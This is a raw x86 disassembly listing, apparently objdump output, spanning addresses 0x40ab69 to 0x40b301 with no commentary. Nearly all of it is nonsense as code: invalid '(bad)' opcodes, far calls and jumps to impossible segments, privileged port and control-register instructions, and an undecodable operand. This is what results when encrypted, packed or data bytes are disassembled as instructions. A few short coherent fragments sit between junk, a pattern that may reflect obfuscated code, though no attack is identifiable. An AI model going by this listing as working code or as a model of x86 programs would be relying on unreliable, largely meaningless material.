  40ab69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab6a:	ins    DWORD PTR es:[edi],dx
  40ab6b:	fmul   QWORD PTR [edi+0x6fc3aaed]
  40ab71:	lock shl dl,0xe8
  40ab75:	dec    ebp
  40ab76:	ins    BYTE PTR es:[edi],dx
  40ab77:	(bad)  
  40ab78:	and    ch,BYTE PTR [esi]
  40ab7a:	test   DWORD PTR [edi+0x4],esp
  40ab7d:	rcl    DWORD PTR [edx+ecx*8-0x616e51da],1
  40ab84:	push   es
  40ab85:	xlat   BYTE PTR ds:[ebx]
  40ab86:	dec    eax
  40ab87:	cs sti 
  40ab89:	jno    0x40abf8
  40ab8b:	pop    edi
  40ab8c:	xchg   DWORD PTR [edi+0xc],esp
  40ab8f:	stc    
  40ab90:	mov    esp,0x1d2012e5
  40ab95:	push   ss
  40ab96:	mov    dl,0x33
  40ab98:	ds shl eax,cl
  40ab9b:	xor    DWORD PTR [eax+0x4f],esp
  40ab9e:	shr    BYTE PTR ds:0xba069e1c,cl
  40aba4:	mov    bl,0x8
  40aba6:	call   0xcec8:0x2b3f1f29
  40abad:	mov    dl,0x92
  40abaf:	aaa    
  40abb0:	call   0xcd46d662
  40abb5:	or     BYTE PTR [eax-0x28],dl
  40abb8:	jle    0x40abee
  40abba:	jle    0x40ac06
  40abbc:	fisttp WORD PTR [esi+edi*1+0x44]
  40abc0:	mov    bh,0x20
  40abc2:	pop    edi
  40abc3:	sub    bh,bh
  40abc5:	push   es
  40abc6:	cmp    al,0x5c
  40abc8:	mov    al,0xc1
  40abca:	call   0x6685:0x7c816b68
  40abd1:	dec    DWORD PTR [esi+0x2751c34f]
  40abd7:	js     0x40ab76
  40abd9:	ror    BYTE PTR ds:0x4374b241,1
  40abdf:	mov    edx,0x61065b5e
  40abe4:	pusha  
  40abe5:	or     bl,cl
  40abe7:	call   FWORD PTR [eax-0x25b2fcc9]
  40abed:	(bad)  
  40abef:	mov    dh,BYTE PTR [edx]
  40abf1:	sub    BYTE PTR [ebx+eax*2-0x2b],dl
  40abf5:	sub    cl,BYTE PTR [edi]
  40abf7:	call   0x7af01b8c
  40abfc:	ffree  st(5)
  40abfe:	ins    BYTE PTR es:[edi],dx
  40abff:	hlt    
  40ac00:	gs aad 0x7b
  40ac03:	(bad)  
  40ac04:	aad    0x1d
  40ac06:	cmp    BYTE PTR [edi],cl
  40ac08:	pop    ecx
  40ac09:	int3   
  40ac0a:	mov    edi,0x80312dbb
  40ac0f:	stos   BYTE PTR es:[edi],al
  40ac10:	sub    eax,0x3d903dc0
  40ac15:	nop
  40ac16:	js     0x40abf4
  40ac18:	pop    ebp
  40ac19:	dec    edi
  40ac1a:	jo     0x40ac97
  40ac1c:	mov    ds:0x42454f96,al
  40ac21:	jnp    0x40abc6
  40ac23:	adc    esi,DWORD PTR [esi+0x1a]
  40ac26:	iret   
  40ac27:	inc    edi
  40ac28:	sahf   
  40ac29:	push   ecx
  40ac2a:	fs cld 
  40ac2c:	dec    edx
  40ac2d:	mov    bh,0x5b
  40ac2f:	pop    ebp
  40ac30:	sbb    eax,0x8ee0f62b
  40ac35:	pop    ecx
  40ac36:	jg     0x40ac47
  40ac38:	mov    DWORD PTR [ecx],edi
  40ac3a:	test   eax,0xd41f1aaa
  40ac3f:	inc    esp
  40ac40:	add    edi,DWORD PTR [ebx+0x3f90330]
  40ac46:	ror    DWORD PTR [edi],1
  40ac48:	scas   eax,DWORD PTR es:[edi]
  40ac49:	xlat   BYTE PTR ds:[ebx]
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0x7f6a3c5e
  40ac5f:	jbe    0x40ac6c
  40ac61:	iret   
  40ac62:	cmp    eax,0xca7c7cfc
  40ac67:	jns    0x40ace5
  40ac69:	jl     0x40ac87
  40ac6b:	dec    ecx
  40ac6c:	cmp    DWORD PTR [eax-0x6d],ebx
  40ac6f:	call   0x19563248
  40ac74:	shl    DWORD PTR [esi-0x76],cl
  40ac77:	stc    
  40ac78:	or     al,0xe
  40ac7a:	xchg   ebx,eax
  40ac7b:	imul   ebp,DWORD PTR [ebp-0x7c9c5947],0xfffffffc
  40ac82:	jnp    0x40ac32
  40ac84:	cwde   
  40ac85:	xor    esi,ebp
  40ac87:	loope  0x40acad
  40ac89:	fdivp  st(1),st
  40ac8b:	sti    
  40ac8c:	cwde   
  40ac8d:	cli    
  40ac8e:	and    ah,BYTE PTR [esi+ebp*4]
  40ac91:	jecxz  0x40acd3
  40ac93:	retf   
  40ac94:	in     al,dx
  40ac95:	sbb    edx,DWORD PTR [esi-0x2dc0b0c3]
  40ac9b:	cmc    
  40ac9c:	mov    ebp,0x4a848a92
  40aca1:	fmul   st,st(7)
  40aca3:	dec    edi
  40aca4:	inc    ebp
  40aca5:	jmp    0x1103:0xc5157b57
  40acac:	call   DWORD PTR [ebx]
  40acae:	sbb    bl,BYTE PTR [edi+edi*4+0x2cbee574]
  40acb5:	fwait
  40acb6:	adc    BYTE PTR [edx-0x7],bh
  40acb9:	jno    0x40ace0
  40acbb:	mov    DWORD PTR [esi],esi
  40acbd:	int    0xfa
  40acbf:	out    0xa9,al
  40acc1:	inc    ebx
  40acc2:	inc    eax
  40acc3:	int3   
  40acc4:	pop    esp
  40acc5:	dec    eax
  40acc6:	jle    0x40ac5b
  40acc8:	mov    ds:0x133df719,al
  40accd:	push   ds
  40acce:	shl    BYTE PTR ds:0xba5586b1,cl
  40acd4:	xor    eax,0xf94e12d0
  40acd9:	push   esi
  40acda:	loope  0x40aca0
  40acdc:	pop    edi
  40acdd:	fstp   DWORD PTR [edx+eax*1-0x2a49bd7c]
  40ace4:	sar    BYTE PTR [ecx+0x363f7358],cl
  40acea:	jge    0x40ad66
  40acec:	loope  0x40acb0
  40acee:	inc    ebx
  40acef:	test   al,0x6e
  40acf1:	leave  
  40acf2:	xor    al,0x45
  40acf4:	sbb    DWORD PTR [esi],esp
  40acf6:	jb     0x40ad64
  40acf8:	fs int3 
  40acfa:	xchg   ebx,eax
  40acfb:	in     eax,0xf4
  40acfd:	jnp    0x40acd6
  40acff:	add    BYTE PTR [ebx+edx*8-0x3d60ee2a],0xb4
  40ad07:	out    0x9,al
  40ad09:	adc    esi,esp
  40ad0b:	retf   
  40ad0c:	push   0xdd670f1a
  40ad11:	jae    0x40ad39
  40ad13:	data16 in al,dx
  40ad15:	dec    esp
  40ad16:	sahf   
  40ad17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad19:	cmp    edx,DWORD PTR [edi+0x3d138d34]
  40ad1f:	jmp    0x40ad33
  40ad21:	enter  0x221d,0x99
  40ad25:	icebp  
  40ad26:	int    0xa9
  40ad28:	xor    BYTE PTR [eax],ah
  40ad2a:	dec    ecx
  40ad2b:	jo     0x40ad70
  40ad2d:	fldcw  WORD PTR [edi+edx*2]
  40ad30:	call   0x944186c2
  40ad35:	pop    ss
  40ad36:	dec    edx
  40ad37:	shr    DWORD PTR [eax],cl
  40ad39:	aam    0x8f
  40ad3b:	xor    eax,0x8df888b5
  40ad40:	fst    QWORD PTR [ebx+0x4773db]
  40ad46:	pop    ds
  40ad47:	rol    DWORD PTR [eax-0x4],0x23
  40ad4b:	pop    es
  40ad4c:	not    ecx
  40ad4e:	loope  0x40ada4
  40ad50:	jmp    0x40ad1c
  40ad52:	jmp    0x4cb9:0xb38fe6c7
  40ad59:	repnz aam 0x2e
  40ad5c:	gs cli 
  40ad5e:	jae    0x40ad0f
  40ad60:	ror    DWORD PTR [ecx],cl
  40ad62:	sti    
  40ad63:	inc    ebp
  40ad64:	mov    esi,0xf4076dd4
  40ad69:	sbb    eax,0x8cca92d6
  40ad6e:	fstp   DWORD PTR [eax-0x5]
  40ad71:	xchg   ebx,eax
  40ad72:	cmp    DWORD PTR [esi],esi
  40ad74:	pop    ss
  40ad75:	jns    0x40ad61
  40ad77:	retf   
  40ad78:	ins    BYTE PTR es:[edi],dx
  40ad79:	popf   
  40ad7a:	dec    ebx
  40ad7b:	dec    ebx
  40ad7c:	push   ds
  40ad7d:	outs   dx,BYTE PTR ds:[esi]
  40ad7e:	pop    ss
  40ad7f:	sub    BYTE PTR [ebx-0x632bf03e],al
  40ad85:	test   al,0x8b
  40ad87:	int    0xd6
  40ad89:	les    ebx,FWORD PTR [edx]
  40ad8b:	cmc    
  40ad8c:	int    0x70
  40ad8e:	fld    QWORD PTR ds:0x150834ba
  40ad94:	hlt    
  40ad95:	stos   BYTE PTR es:[edi],al
  40ad96:	stos   BYTE PTR es:[edi],al
  40ad97:	popa   
  40ad98:	aas    
  40ad99:	aam    0x8c
  40ad9b:	inc    ebp
  40ad9c:	jmp    0x40ad47
  40ad9e:	xchg   edx,eax
  40ad9f:	pop    ds
  40ada0:	jmp    0xebf5:0xf18bf86c
  40ada7:	and    esi,DWORD PTR [eax+0x2a10fa1f]
  40adad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adae:	lock mov ebp,0xfcbef1aa
  40adb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adb5:	jmp    0x8218d6a1
  40adba:	(bad)
  40adbe:	or     eax,0xac974b19
  40adc3:	mov    eax,ds:0xef628550
  40adc8:	or     eax,0x20331956
  40adcd:	jo     0x40ad5b
  40adcf:	dec    esi
  40add0:	inc    eax
  40add1:	icebp  
  40add2:	popf   
  40add3:	and    eax,0x1b1ff419
  40add8:	xchg   ecx,eax
  40add9:	enter  0x417a,0x8e
  40addd:	jo     0x40ae2b
  40addf:	add    dl,BYTE PTR [ecx+0x75]
  40ade2:	out    dx,eax
  40ade3:	mov    ebp,0x8c0e4982
  40ade8:	or     al,0x13
  40adea:	shl    BYTE PTR [ecx-0x770927a2],0xd5
  40adf1:	je     0x40addc
  40adf3:	mov    eax,ds:0x11196c4b
  40adf8:	pop    es
  40adf9:	lea    ebp,[esi-0x7bd2b648]
  40adff:	loope  0x40ae3b
  40ae01:	mov    dl,0x72
  40ae03:	out    dx,al
  40ae04:	in     al,dx
  40ae05:	(bad)  
  40ae06:	popa   
  40ae07:	dec    esi
  40ae08:	fs ja  0x40ae18
  40ae0b:	dec    ecx
  40ae0c:	ins    BYTE PTR es:[edi],dx
  40ae0d:	arpl   WORD PTR [eax-0x77],di
  40ae10:	and    eax,0x61abe7b5
  40ae15:	out    dx,al
  40ae16:	mov    eax,0xaa993c7c
  40ae1b:	(bad)  
  40ae1c:	in     al,0x35
  40ae1e:	ror    DWORD PTR [edi+0x702f75cc],cl
  40ae24:	add    al,0xd8
  40ae26:	fcomp  QWORD PTR [eax]
  40ae28:	rcl    edx,0xfa
  40ae2b:	repz jg 0x40adb6
  40ae2e:	add    dl,BYTE PTR [ebx*4+0x5a6f5acd]
  40ae35:	fmulp  st(1),st
  40ae37:	not    BYTE PTR [ebx+0x6a]
  40ae3a:	hlt    
  40ae3b:	es pop esi
  40ae3d:	add    BYTE PTR [edx],dl
  40ae3f:	jo     0x40ae97
  40ae41:	inc    ebp
  40ae42:	pop    edx
  40ae43:	inc    ebx
  40ae44:	xchg   esi,eax
  40ae45:	ror    DWORD PTR [ecx],cl
  40ae47:	ror    BYTE PTR [edx+0x638c8bd5],1
  40ae4d:	and    bl,BYTE PTR [edx]
  40ae4f:	add    bh,dl
  40ae51:	sbb    edi,DWORD PTR [edx]
  40ae53:	jnp    0x40ae3a
  40ae55:	inc    esp
  40ae56:	stos   BYTE PTR es:[edi],al
  40ae57:	sbb    al,0xe8
  40ae59:	stos   BYTE PTR es:[edi],al
  40ae5a:	sbb    DWORD PTR ds:0x95895288,0x48
  40ae61:	repz cmp BYTE PTR [ebx-0x2d],0x75
  40ae66:	mov    bh,0x9d
  40ae68:	mov    dh,0xcd
  40ae6a:	add    edi,eax
  40ae6c:	dec    ecx
  40ae6d:	fs push es
  40ae6f:	addr16 push ds
  40ae71:	addr16 sub eax,esp
  40ae74:	jmp    0xed9aab72
  40ae79:	xlat   BYTE PTR ds:[ebx]
  40ae7a:	or     eax,0xbe1d6c24
  40ae7f:	rol    DWORD PTR [ecx-0x12],cl
  40ae82:	mov    ds,WORD PTR [ebx+0x54e6844b]
  40ae88:	pusha  
  40ae89:	jns    0x40aebf
  40ae8b:	js     0x40aed5
  40ae8d:	mov    esp,0xb4981a31
  40ae92:	stc    
  40ae93:	push   ecx
  40ae94:	xor    edi,ebx
  40ae96:	dec    edx
  40ae97:	push   esp
  40ae98:	mov    eax,ds:0xf4ef713a
  40ae9d:	pop    edx
  40ae9e:	repnz fcmovbe st,st(6)
  40aea1:	clc    
  40aea2:	fst    DWORD PTR [ebx+0x34]
  40aea5:	mov    cr6,edx
  40aea8:	cwde   
  40aea9:	int    0x68
  40aeab:	adc    eax,0x63b13532
  40aeb0:	jmp    0x40ae41
  40aeb2:	nop
  40aeb3:	fcomp  QWORD PTR [ecx+0xd]
  40aeb6:	int3   
  40aeb7:	xchg   DWORD PTR [edi+0x2e],edi
  40aeba:	sub    eax,0x54d33919
  40aebf:	and    DWORD PTR [edx],esi
  40aec1:	pop    edi
  40aec2:	cmc    
  40aec3:	cld    
  40aec4:	jne    0x40af29
  40aec6:	or     BYTE PTR [ecx-0x4183475f],dl
  40aecc:	jle    0x40aece
  40aece:	adc    cl,BYTE PTR [edx]
  40aed0:	adc    BYTE PTR [edi+0x2a],ch
  40aed3:	jmp    0x9285:0x1ef72612
  40aeda:	adc    al,0xcc
  40aedc:	repnz lods al,BYTE PTR ds:[esi]
  40aede:	ins    DWORD PTR es:[edi],dx
  40aedf:	std    
  40aee0:	push   es
  40aee1:	sbb    bh,BYTE PTR ds:0x1cc143a
  40aee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aee8:	enter  0xc22e,0xd3
  40aeec:	mov    al,0x96
  40aeee:	jae    0x40af22
  40aef0:	mov    ah,0xb5
  40aef2:	pop    ecx
  40aef3:	jmp    DWORD PTR [eax+eiz*4]
  40aef6:	add    eax,DWORD PTR [esi+ecx*4]
  40aef9:	push   ecx
  40aefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aefb:	addr16 out 0x4d,eax
  40aefe:	ss sbb al,0xf6
  40af01:	and    eax,0x1a01751
  40af06:	loope  0x40aecc
  40af08:	jns    0x40aef8
  40af0a:	jne    0x40aee8
  40af0c:	shl    BYTE PTR [ecx],1
  40af0e:	xchg   ecx,eax
  40af0f:	test   DWORD PTR [edx+ecx*8-0x3a],edi
  40af13:	inc    esi
  40af14:	xchg   ebp,eax
  40af15:	mov    ds:0x20e85a2e,al
  40af1a:	out    dx,al
  40af1b:	cdq    
  40af1c:	lods   eax,DWORD PTR ds:[esi]
  40af1d:	call   0xd361:0x92ff2bd1
  40af24:	xchg   edi,eax
  40af25:	icebp  
  40af26:	sbb    al,0xa9
  40af28:	push   eax
  40af29:	jnp    0x40af75
  40af2b:	dec    edx
  40af2c:	jmp    FWORD PTR [ebx+0x3b]
  40af2f:	cwde   
  40af30:	pop    ecx
  40af31:	ja     0x40af5e
  40af33:	aas    
  40af34:	push   eax
  40af35:	arpl   WORD PTR [esi+0x66],sp
  40af38:	or     DWORD PTR [eax+eax*8],0x900c7684
  40af3f:	leave  
  40af40:	sub    al,0x50
  40af42:	jns    0x40afb8
  40af44:	mov    ah,0x94
  40af46:	jge    0x40af29
  40af48:	enter  0xde49,0x7e
  40af4c:	in     eax,0x2e
  40af4e:	mov    eax,ds:0xfd4f2c09
  40af53:	pop    ecx
  40af54:	mov    BYTE PTR [esi-0x25b25c51],ch
  40af5a:	add    DWORD PTR [ebx-0x1b2cff6c],ebx
  40af60:	cwde   
  40af61:	pushf  
  40af62:	cld    
  40af63:	sbb    edx,DWORD PTR [edx-0x6]
  40af66:	sbb    esi,DWORD PTR cs:[esi-0x14759d2f]
  40af6d:	retf   
  40af6e:	pop    edx
  40af6f:	sub    edi,DWORD PTR [edi]
  40af71:	imul   edx,edi,0x1f
  40af74:	mov    bl,bl
  40af76:	push   esp
  40af77:	inc    edi
  40af78:	cli    
  40af79:	cmp    DWORD PTR [eax+0x5c],esp
  40af7c:	add    edx,DWORD PTR [ebp+0xc]
  40af7f:	fs mov edx,0x9637e2ef
  40af85:	push   ebp
  40af86:	or     ch,BYTE PTR [edx+ebp*2]
  40af89:	dec    ebp
  40af8a:	sbb    DWORD PTR [ecx+0x10004646],ebp
  40af90:	jb     0x40afd6
  40af92:	outs   dx,BYTE PTR ds:[esi]
  40af93:	je     0x40af7b
  40af95:	mov    eax,ds:0xd46fe823
  40af9a:	(bad)  
  40af9c:	mov    al,0xf4
  40af9e:	or     DWORD PTR [edx],ebx
  40afa0:	cmp    ecx,DWORD PTR [ebp+0x53]
  40afa3:	xchg   edi,eax
  40afa4:	add    DWORD PTR [eax-0x26a52e51],ebp
  40afaa:	sbb    bh,BYTE PTR [ebp-0x10237c72]
  40afb0:	xchg   ch,al
  40afb2:	jb     0x40af53
  40afb4:	js     0x40afad
  40afb6:	ins    DWORD PTR es:[edi],dx
  40afb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afb8:	or     eax,0x1ba9785e
  40afbd:	xchg   esp,eax
  40afbe:	(bad)  
  40afbf:	jnp    0x40af4c
  40afc1:	pop    ebp
  40afc2:	lock sub ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fcom   DWORD PTR [esi]
  40b000:	sti    
  40b001:	stos   BYTE PTR es:[edi],al
  40b002:	bound  ecx,QWORD PTR [ebx-0x35838307]
  40b008:	jns    0x40b086
  40b00a:	jl     0x40b049
  40b00c:	(bad)  
  40b010:	imul   esi,DWORD PTR [edx-0x2f0c9421],0xa7c19e81
  40b01a:	sub    al,0xa2
  40b01c:	cli    
  40b01d:	add    ch,BYTE PTR [eax-0x200be31f]
  40b023:	icebp  
  40b024:	popa   
  40b025:	call   0xd4b9:0x6014bc74
  40b02c:	jge    0x40b09a
  40b02e:	ss xchg edi,eax
  40b030:	dec    esp
  40b031:	ss dec ebx
  40b033:	les    edx,FWORD PTR [ebx+0x1fb2d11a]
  40b039:	shl    BYTE PTR [eax+ebp*2],0x40
  40b03d:	xchg   esi,eax
  40b03e:	mov    ebp,ecx
  40b040:	xor    DWORD PTR [esi-0x5d819e7c],ebx
  40b046:	fisub  DWORD PTR [edi+0x7d39c08b]
  40b04c:	retf   0x6a57
  40b04f:	(bad)  
  40b050:	dec    edx
  40b051:	push   0x4c
  40b053:	loop   0x40b009
  40b055:	outs   dx,BYTE PTR ds:[esi]
  40b056:	push   ebx
  40b057:	and    dl,BYTE PTR [eax-0x28]
  40b05a:	add    al,0xc1
  40b05c:	or     al,0xe3
  40b05e:	mov    ?,WORD PTR [eax-0x4f]
  40b061:	mov    dl,0xb5
  40b063:	imul   ecx,DWORD PTR [ebx+ebp*8],0x49333470
  40b06a:	cmp    edx,ecx
  40b06c:	outs   dx,DWORD PTR ds:[esi]
  40b06d:	neg    esp
  40b06f:	adc    edi,esi
  40b071:	jae    0x40b060
  40b073:	adc    eax,0x85c3c679
  40b078:	pop    ebp
  40b079:	cli    
  40b07a:	jne    0x40b087
  40b07c:	push   ss
  40b07d:	mov    al,ds:0x2cc9b8c8
  40b082:	mov    ebp,0x573b820f
  40b087:	add    al,0x37
  40b089:	sbb    bh,BYTE PTR [edx-0x39be2c9f]
  40b08f:	cmp    DWORD PTR [ecx-0x148327b],eax
  40b095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b096:	test   DWORD PTR [ebp+0x59],0xa862752c
  40b09d:	mov    bh,0xf9
  40b09f:	fld    DWORD PTR [esp+eiz*2]
  40b0a2:	es ds inc edi
  40b0a5:	or     ah,dh
  40b0a7:	and    al,BYTE PTR [edx-0x23]
  40b0aa:	shl    esi,0x6f
  40b0ad:	fnsave [ebp+edx*1-0x71d34227]
  40b0b4:	adc    DWORD PTR [eax],esi
  40b0b6:	iret   
  40b0b7:	push   eax
  40b0b8:	es std 
  40b0ba:	out    0xfa,eax
  40b0bc:	test   eax,0x5645297e
  40b0c1:	mov    WORD PTR [eax+0x47],ds
  40b0c4:	sub    DWORD PTR [edx+0x5e],ecx
  40b0c7:	cmp    al,0x1f
  40b0c9:	inc    eax
  40b0ca:	and    al,BYTE PTR [ebx+esi*4-0x43aa6a54]
  40b0d1:	sbb    ecx,DWORD PTR [ebp+0x3bb98f18]
  40b0d7:	mov    eax,ds:0x633c5a4d
  40b0dc:	icebp  
  40b0dd:	xchg   esi,eax
  40b0de:	push   edi
  40b0df:	imul   ebp,DWORD PTR [ebx],0x24e3e9d3
  40b0e5:	fld    TBYTE PTR [ecx-0x599a4205]
  40b0eb:	shl    DWORD PTR [ecx-0x1a],1
  40b0ee:	inc    esi
  40b0ef:	js     0x40b0ba
  40b0f1:	std    
  40b0f2:	test   eax,0x78c1e0e1
  40b0f7:	call   0x1729b2af
  40b0fc:	pop    esp
  40b0fd:	mov    ecx,0x74e99ccd
  40b102:	fmulp  st(4),st
  40b104:	mov    eax,ds:0xee984d8b
  40b109:	mov    dl,0x2
  40b10b:	or     eax,0x2b157b1f
  40b110:	pushf  
  40b111:	xor    BYTE PTR ds:0x787ef4dc,cl
  40b117:	push   cs
  40b118:	rol    BYTE PTR [ecx],0x52
  40b11b:	lods   eax,DWORD PTR ds:[esi]
  40b11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b11d:	dec    ecx
  40b11e:	mov    edi,0xad4a5018
  40b123:	sbb    DWORD PTR [ebx-0x24c2794e],eax
  40b129:	adc    bh,BYTE PTR [eax]
  40b12b:	mov    al,0xcc
  40b12d:	cmp    al,BYTE PTR [edi-0x18]
  40b130:	mov    ds:0x1c473d26,al
  40b135:	(bad)  
  40b136:	rcl    BYTE PTR [ebx+0xd],cl
  40b139:	xor    cl,dl
  40b13b:	test   al,0xc2
  40b13d:	addr16 (bad) 
  40b140:	sbb    dh,BYTE PTR [edx-0x7a]
  40b143:	push   0x5ecceff4
  40b148:	icebp  
  40b149:	in     al,0x3d
  40b14b:	jecxz  0x40b157
  40b14d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b14e:	fucomip st,st(6)
  40b150:	repnz pusha 
  40b152:	adc    bh,BYTE PTR ds:0x1699dead
  40b158:	mov    edi,0xff205e87
  40b15d:	sub    DWORD PTR [edx+0x51757393],0x10
  40b164:	lods   al,BYTE PTR ds:[esi]
  40b165:	jge    0x40b0e7
  40b167:	stos   DWORD PTR es:[edi],eax
  40b168:	dec    ebx
  40b169:	and    BYTE PTR [esi+eiz*2-0x49c55b44],bh
  40b170:	clc    
  40b171:	ret    
  40b172:	jmp    0x5ec9f59f
  40b177:	jg     0x40b108
  40b179:	stc    
  40b17a:	sbb    BYTE PTR [edx+0x5e0f8efb],cl
  40b180:	jne    0x40b1f5
  40b182:	mov    BYTE PTR [esi],bl
  40b184:	xchg   ebx,eax
  40b185:	cmp    eax,0x2d4d158
  40b18a:	aam    0xe2
  40b18c:	dec    esi
  40b18d:	pop    edx
  40b18e:	nop
  40b18f:	xchg   cl,cl
  40b191:	mov    esp,DWORD PTR [esi+0x20fad41d]
  40b197:	and    al,0xfd
  40b199:	jno    0x40b1e2
  40b19b:	add    eax,0x746caa18
  40b1a0:	shl    esp,cl
  40b1a2:	mov    edx,0x277dfed3
  40b1a7:	and    al,0xbc
  40b1a9:	ror    BYTE PTR [eax+0x1c076876],1
  40b1af:	hlt    
  40b1b0:	call   0xb5cf5c7a
  40b1b5:	sbb    ah,BYTE PTR [ebx+edx*1]
  40b1b8:	loopne 0x40b175
  40b1ba:	imul   DWORD PTR [edi-0x30]
  40b1bd:	add    BYTE PTR [esi],dl
  40b1bf:	sbb    DWORD PTR [edx-0x1b885079],eax
  40b1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1c6:	and    eax,0xfbe2b01
  40b1cb:	push   ecx
  40b1cc:	jmp    0x9ab1:0x6f1db59c
  40b1d3:	jo     0x40b1fc
  40b1d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d7:	pop    ebp
  40b1d8:	dec    ecx
  40b1d9:	sub    al,ah
  40b1db:	cwde   
  40b1dc:	push   0xfab3c47b
  40b1e1:	rcl    BYTE PTR [ebp-0x35a1fa25],1
  40b1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1e8:	mov    ah,0x87
  40b1ea:	mov    eax,0x7327c416
  40b1ef:	add    eax,0x4ea028f
  40b1f4:	call   0x2a092c7e
  40b1f9:	lock out 0x83,al
  40b1fc:	retf   0x1f79
  40b1ff:	ds inc ecx
  40b201:	push   esi
  40b202:	cmp    bh,bh
  40b204:	fwait
  40b205:	clc    
  40b206:	jmp    0x1251:0x98826fa2
  40b20d:	xchg   esi,eax
  40b20e:	in     eax,dx
  40b20f:	das    
  40b210:	imul   esi,ebx,0xc99b5128
  40b216:	es push eax
  40b218:	ret    0x2463
  40b21b:	or     ebx,DWORD PTR [ebx]
  40b21d:	pop    edx
  40b21e:	inc    ebp
  40b21f:	(bad)
  40b223:	out    0x8a,eax
  40b225:	and    al,0xd8
  40b227:	repz (bad) 
  40b229:	lds    esi,FWORD PTR [ebx+0x2f]
  40b22c:	scas   al,BYTE PTR es:[edi]
  40b22d:	inc    ebp
  40b22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b22f:	out    0x16,al
  40b231:	cld    
  40b232:	arpl   WORD PTR [ebx],bp
  40b234:	jbe    0x40b224
  40b236:	dec    ebp
  40b237:	dec    ecx
  40b238:	vpaddusb xmm1,xmm6,XMMWORD PTR ds:0x6d275b7f
  40b240:	cmc    
  40b241:	leave  
  40b242:	xlat   BYTE PTR ds:[ebx]
  40b243:	cli    
  40b244:	jmp    0x40b1e9
  40b246:	inc    ecx
  40b247:	add    edi,ebp
  40b249:	mov    eax,ds:0xc90b9425
  40b24e:	test   al,0x1e
  40b250:	push   ecx
  40b251:	jle    0x40b25d
  40b253:	pop    ebx
  40b254:	adc    edx,esi
  40b256:	mov    BYTE PTR [eax],dh
  40b258:	pop    ecx
  40b259:	ja     0x40b285
  40b25b:	xchg   BYTE PTR [edx-0x5d629fd9],ch
  40b261:	fistp  DWORD PTR [ebp-0x44]
  40b264:	or     eax,0xfffffff6
  40b267:	ja     0x40b1ef
  40b269:	out    0xb4,al
  40b26b:	ret    0x29ec
  40b26e:	add    BYTE PTR [esi],ah
  40b270:	mov    ch,0xfd
  40b272:	sahf   
  40b273:	cmp    al,0x6
  40b275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b276:	jae    0x40b2df
  40b278:	cmp    eax,0xe37a0821
  40b27d:	and    ebx,DWORD PTR [ecx+esi*2]
  40b280:	repz push 0x7a
  40b283:	inc    ebx
  40b284:	mov    ebx,0x34321870
  40b289:	mov    ds:0x5d0b887b,eax
  40b28e:	leave  
  40b28f:	or     BYTE PTR [eax+0x394b63a2],dl
  40b295:	pop    edi
  40b296:	cmp    eax,0xb0411086
  40b29b:	je     0x40b2ec
  40b29d:	sub    BYTE PTR [edx],bh
  40b29f:	(bad)  
  40b2a0:	inc    bl
  40b2a2:	shl    DWORD PTR [eax-0x79d7409d],0xd5
  40b2a9:	and    ebx,DWORD PTR [edx+0x1e]
  40b2ac:	inc    ebx
  40b2ad:	jecxz  0x40b2ed
  40b2af:	and    DWORD PTR [eax-0x6cf4c190],0xb046d317
  40b2b9:	inc    eax
  40b2ba:	lahf   
  40b2bb:	push   ecx
  40b2bc:	retf   
  40b2bd:	cli    
  40b2be:	xor    eax,0x4282095e
  40b2c3:	add    dl,BYTE PTR [eax-0x43a759cd]
  40b2c9:	push   edx
  40b2ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2cb:	(bad)  
  40b2cd:	mov    WORD PTR [ecx-0x1e],gs
  40b2d0:	ins    BYTE PTR es:[di],dx
  40b2d2:	pop    es
  40b2d3:	icebp  
  40b2d4:	jmp    0x2af3:0x22c145b5
  40b2db:	je     0x40b34d
  40b2dd:	fisub  WORD PTR [eax]
  40b2df:	fwait
  40b2e0:	cmp    ebp,eax
  40b2e2:	hlt    
  40b2e3:	or     al,BYTE PTR [ecx-0x5b]
  40b2e6:	rol    DWORD PTR [ebp+0x9],0x5
  40b2ea:	and    eax,0xb8007bae
  40b2ef:	mov    ch,0x54
  40b2f1:	dec    edx
  40b2f2:	sub    ah,bh
  40b2f4:	xchg   esi,eax
  40b2f5:	mov    ds:0x5a1dbdf1,eax
  40b2fa:	leave  
  40b2fb:	(bad)  
  40b2fc:	mov    edi,0xbc40bc9c
  40b301:	rcr    BYTE PTR [edi-0x489dc50b],1
